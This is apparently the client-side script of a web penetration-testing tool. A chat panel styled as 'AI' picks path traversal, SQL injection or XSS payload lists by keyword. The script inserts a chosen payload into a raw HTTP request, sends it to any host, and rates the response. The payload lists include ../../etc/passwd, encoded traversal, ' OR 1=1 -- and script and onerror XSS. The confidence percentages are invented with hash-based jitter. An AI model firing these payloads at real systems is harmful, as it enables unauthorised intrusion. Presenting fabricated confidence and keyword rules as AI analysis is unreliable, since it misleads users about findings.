let count = 0;

window.addEventListener("DOMContentLoaded", () => {
    loadDefaultPayloads();
});

function loadDefaultPayloads() {
    const payloads = ["test.txt", "images/logo.png", "profile/avatar.jpg"];
    fillPayloadDropdown(payloads);
}

function askAI() {
    const userMessage = document.getElementById("chatInput").value;
    const requestArea = document.getElementById("requestArea");
    const chatBox = document.getElementById("chatBox");

    if (!userMessage.trim()) return;

    addChatMessage("You", userMessage);

    const aiResult = analyzeRequestLikeAI(userMessage, requestArea.value);

    requestArea.value = aiResult.markedRequest;
    fillPayloadDropdown(aiResult.payloads);

    addChatMessage(
        "AI",
        `Found injection point: ${aiResult.injectionPoint}. Generated ${aiResult.payloads.length} ${aiResult.vulnerabilityType} payloads.`
    );

    document.getElementById("chatInput").value = "";
    chatBox.scrollTop = chatBox.scrollHeight;
}

function analyzeRequestLikeAI(userMessage, rawRequest) {
    const vulnerabilityType = detectVulnerabilityType(userMessage);
    const injectionPoint = findInjectionPoint(rawRequest, vulnerabilityType);
    const markedRequest = markInjectionPoint(rawRequest, injectionPoint);
    const payloads = generatePayloadsForType(vulnerabilityType);

    return {
        vulnerabilityType,
        injectionPoint,
        markedRequest,
        payloads
    };
}

function detectVulnerabilityType(message) {
    const lower = message.toLowerCase();

    if (lower.includes("path") || lower.includes("traversal") || lower.includes("file")) {
        return "path traversal";
    }

    if (lower.includes("sql")) {
        return "sql injection";
    }

    if (lower.includes("xss") || lower.includes("script")) {
        return "xss";
    }

    return "generic";
}

function findInjectionPoint(rawRequest, vulnerabilityType) {
    const requestLine = rawRequest.split("\n")[0];

    const pathParams = ["file", "filename", "path", "name", "page", "template", "document", "download"];
    const sqlParams = ["id", "user", "username", "email", "search", "query", "category"];
    const xssParams = ["q", "search", "message", "comment", "name", "title"];

    let preferredParams = [];

    if (vulnerabilityType === "path traversal") preferredParams = pathParams;
    if (vulnerabilityType === "sql injection") preferredParams = sqlParams;
    if (vulnerabilityType === "xss") preferredParams = xssParams;

    for (const param of preferredParams) {
        const regex = new RegExp(`([?&])${param}=([^&\\s]+)`, "i");

        if (regex.test(requestLine)) {
            return param;
        }
    }

    const firstParam = requestLine.match(/[?&]([^=&\s]+)=([^&\s]+)/);

    if (firstParam) {
        return firstParam[1];
    }

    return "first editable value";
}

function markInjectionPoint(rawRequest, injectionPoint) {
    if (injectionPoint !== "first editable value") {
        const regex = new RegExp(`([?&]${injectionPoint}=)([^&\\s]+)`, "i");

        if (regex.test(rawRequest)) {
            return rawRequest.replace(regex, "$1[PAYLOAD]");
        }
    }

    if (rawRequest.includes("{") && rawRequest.includes("}")) {
        return rawRequest.replace(/"([^"]+)":\s*"([^"]*)"/, `"$1":"[PAYLOAD]"`);
    }

    return rawRequest.replace(/([?&][^=\s]+)=([^&\s]+)/, "$1=[PAYLOAD]");
}

function generatePayloadsForType(type) {
    if (type === "path traversal") {
        return [
            "test.txt",
            "images/logo.png",
            "profile/avatar.jpg",
            "documents/report.pdf",

            "backup/config.old",
            "config.bak",
            "....//etc/passwd",
            "logs/access.log",

            "../config.php",
            "../settings.json",
            "../backup.zip",
            "%2e%2e%2fconfig.php",
            "%252e%252e%252fconfig.php",

            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",

            "..\\..\\windows\\win.ini",
            "../var/log/auth.log",
            "/etc/passwd"
        ];
    }

    if (type === "sql injection") {
        return [
            "1",
            "'",
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--",
            "' OR 'a'='a",
            "1 OR 1=1",
            "') OR ('1'='1"
        ];
    }

    if (type === "xss") {
        return [
            "hello",
            "<script>alert('test')</script>",
            "\"><script>alert('test')</script>",
            "<img src=x onerror=alert('test')>",
            "<svg onload=alert('test')>",
            "'><script>alert('test')</script>",
            "<body onload=alert('test')>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<iframe src='javascript:alert(1)'></iframe>"
        ];
    }

    return ["test", "12345", "admin", "null", "true"];
}

function fillPayloadDropdown(payloads) {
    const select = document.getElementById("payloadSelect");
    select.innerHTML = "";

    payloads.forEach(payload => {
        const option = document.createElement("option");
        option.value = payload;
        option.textContent = payload;
        select.appendChild(option);
    });
}

async function sendRequest() {
    const payload = document.getElementById("payloadSelect").value;
    const requestArea = document.getElementById("requestArea");
    const responseBox = document.getElementById("responseArea");

    const rawRequest = requestArea.value.replaceAll("[PAYLOAD]", payload);

    responseBox.value = "Sending request...";

    try {
        const parsed = parseRawRequest(rawRequest);

        const options = {
            method: parsed.method,
            headers: parsed.headers
        };

        if (parsed.method !== "GET" && parsed.method !== "HEAD") {
            options.body = parsed.body;
        }

        const response = await fetch(parsed.url, options);
        const responseText = await response.text();

        let formattedResponse = `HTTP/1.1 ${response.status} ${response.statusText}\n`;

        response.headers.forEach((value, key) => {
            formattedResponse += `${key}: ${value}\n`;
        });

        formattedResponse += `\n${responseText}`;

        responseBox.value = formattedResponse;

        addHistory(payload, response.status, formattedResponse.length, formattedResponse);
    } catch (error) {
        const errorText =
            `Request failed:\n\n${error.message}\n\nPossible causes:\n` +
            `- Backend server is not running\n` +
            `- Host or path is incorrect\n` +
            `- Browser blocked the request\n` +
            `- Request format is invalid`;

        responseBox.value = errorText;
        addHistory(payload, "ERR", 0, errorText);
    }
}

function parseRawRequest(rawRequest) {
    const lines = rawRequest.replace(/\r/g, "").split("\n");

    const firstLineIndex = lines.findIndex(line => line.trim() !== "");

    if (firstLineIndex === -1) {
        throw new Error("Request box is empty.");
    }

    const requestLine = lines[firstLineIndex].trim();
    const [method, path] = requestLine.split(/\s+/);

    if (!method || !path) {
        throw new Error("Invalid request line.");
    }

    const headers = {};
    let bodyStartIndex = -1;

    for (let i = firstLineIndex + 1; i < lines.length; i++) {
        const line = lines[i];

        if (line.trim() === "") {
            bodyStartIndex = i + 1;
            break;
        }

        const separatorIndex = line.indexOf(":");

        if (separatorIndex !== -1) {
            const key = line.slice(0, separatorIndex).trim().toLowerCase();
            const value = line.slice(separatorIndex + 1).trim();
            headers[key] = value;
        }
    }

    const body = bodyStartIndex !== -1
        ? lines.slice(bodyStartIndex).join("\n").trim()
        : "";

    const host = headers.host;

    if (!host) {
        throw new Error("Missing Host header.");
    }

    const protocol =
        host.includes("localhost") || host.includes("127.0.0.1")
            ? "http"
            : "https";

    delete headers.host;

    return {
        method: method.toUpperCase(),
        url: `${protocol}://${host}${path}`,
        headers,
        body
    };
}

function analyzeResponse() {
    const payload = document.getElementById("payloadSelect").value;
    const responseText = document.getElementById("responseArea").value;
    const analysisBox = document.getElementById("analysisBox");

    const result = getVerdict(payload, responseText);

    analysisBox.innerHTML = `
        <div class="${result.cssClass}">
            <strong>${result.icon} ${result.verdict}</strong>
        </div>
        <div><strong>Confidence:</strong> ${result.confidence}%</div>
        <div><strong>Evidence:</strong> ${escapeHTML(result.evidence)}</div>
        <div><strong>Reason:</strong> ${escapeHTML(result.reason)}</div>
    `;
}

function getVerdict(payload, responseText) {
    const p = payload.toLowerCase();
    const r = responseText.toLowerCase();

    let score = 0;
    const evidence = [];

    if (p.includes("../") || p.includes("..\\")) {
        score += 25;
        evidence.push("Traversal pattern found.");
    }

    if (p.includes("%2e%2e") || p.includes("%252e")) {
        score += 22;
        evidence.push("Encoded traversal pattern found.");
    }

    if (p.includes("passwd") || p.includes("win.ini") || p.includes("auth.log")) {
        score += 25;
        evidence.push("Sensitive system file targeted.");
    }

    if (p.includes("backup") || p.includes("config") || p.includes("logs")) {
        score += 15;
        evidence.push("Potentially sensitive app file targeted.");
    }

    if (p.includes("....//")) {
        score += 18;
        evidence.push("Bypass-style path syntax used.");
    }

    if (r.includes("root:x:0:0") || r.includes("vulnerability_confirmed")) {
        score += 45;
        evidence.push("Response exposed sensitive-looking file content.");
    }

    if (r.includes("blocked") || r.includes("path traversal pattern detected")) {
        score += 25;
        evidence.push("Server detected and blocked traversal attempt.");
    }

    if (r.includes("server-side handling error") || r.includes("file resolver rejected")) {
        score += 30;
        evidence.push("Payload caused backend file handling error.");
    }

    if (r.includes("review") || r.includes("unusual file path")) {
        score += 12;
        evidence.push("Response flagged unusual path behavior.");
    }

    score = Math.min(score, 100);

    const confidence = getVariedConfidence(score, payload);

    if (score >= 85) {
        return {
            verdict: "Confirmed Exploit",
            icon: "🔴",
            cssClass: "vulnerable",
            confidence,
            evidence: evidence.join(" "),
            reason: "Sensitive content was returned, so this is treated as confirmed."
        };
    }

    if (score >= 65) {
        return {
            verdict: "Likely Vulnerable",
            icon: "🟠",
            cssClass: "suspicious",
            confidence,
            evidence: evidence.join(" "),
            reason: "The payload caused strong abnormal behavior, but did not fully expose sensitive data."
        };
    }

    if (score >= 35) {
        return {
            verdict: "Suspicious / Needs Review",
            icon: "🟡",
            cssClass: "review",
            confidence,
            evidence: evidence.join(" "),
            reason: "The payload looks risky or caused a warning, but there is not enough proof."
        };
    }

    return {
        verdict: "Safe / Normal",
        icon: "🟢",
        cssClass: "safe",
        confidence,
        evidence: "No meaningful exploit indicators found.",
        reason: "The request and response look normal."
    };
}

function getVariedConfidence(score, payload) {
    let hash = 0;

    for (let i = 0; i < payload.length; i++) {
        hash = payload.charCodeAt(i) + ((hash << 5) - hash);
    }

    const variation = Math.abs(hash % 9) - 4;

    if (score >= 85) return Math.min(98, Math.max(88, 93 + variation));
    if (score >= 65) return Math.min(84, Math.max(70, 76 + variation));
    if (score >= 35) return Math.min(69, Math.max(45, 57 + variation));

    return Math.min(92, Math.max(72, 82 + variation));
}

function addHistory(payload, status, size, responseText = "") {
    count++;

    const table = document.getElementById("historyTable");
    const result = getVerdict(payload, responseText);

    if (status === "ERR") {
        result.verdict = "Request Failed";
        result.icon = "❌";
        result.cssClass = "failed";
        result.confidence = 100;
        result.evidence = "The request could not be completed.";
    }

    table.innerHTML += `
        <tr>
            <td>${count}</td>
            <td>${escapeHTML(payload)}</td>
            <td>${status}</td>
            <td>${size}</td>
            <td class="${result.cssClass}">
                ${result.icon} ${result.verdict}<br>
                <small>${result.confidence}% confidence</small>
            </td>
        </tr>
    `;
}

function addChatMessage(sender, message) {
    const chat = document.getElementById("chatBox");
    chat.innerHTML += `<div><strong>${sender}:</strong> ${escapeHTML(message)}</div>`;
}

function escapeHTML(text) {
    return String(text)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;");
}